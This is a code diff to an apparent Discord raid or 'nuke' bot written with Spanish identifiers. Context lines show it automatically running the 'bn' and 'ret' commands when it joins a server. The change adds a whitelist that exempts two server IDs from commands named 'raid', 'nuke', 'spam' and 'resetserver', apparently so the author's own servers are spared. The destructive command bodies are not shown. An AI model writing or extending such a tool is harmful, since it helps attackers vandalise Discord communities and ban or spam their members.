@@ -41,6 +41,24 @@ async def on_guild_join(guild):
         await bn.callback(ctx)
         await ret.callback(ctx)
 
+ComandosBL = {"ret", "raid", "dr", "spam", "nuke", "cn", "ci", "cr", "resetserver", "bn"}
+
+ServersWL = {1234567893456789421, 134567894256787432}
+
+
+@bot.check
+async def ProteGlobal(ctx):
+    if ctx.guild and ctx.guild.id in ServersWL:
+        if ctx.command and ctx.command.name in ComandosBL:
+            print(f"[Protegido] Comando '{ctx.command.name}' bloqueado en '{ctx.guild.name}' ({ctx.guild.id}) por {ctx.author}")
+            raise commands.CheckFailure("Comando bloqueado en el servidor.")
+    return True
+
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        return
+
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def spam(ctx):
@@ -317,5 +335,6 @@ async def on_ready():
 
 
 bot.run("TOKEN DISCORD BOT")
+
 
 
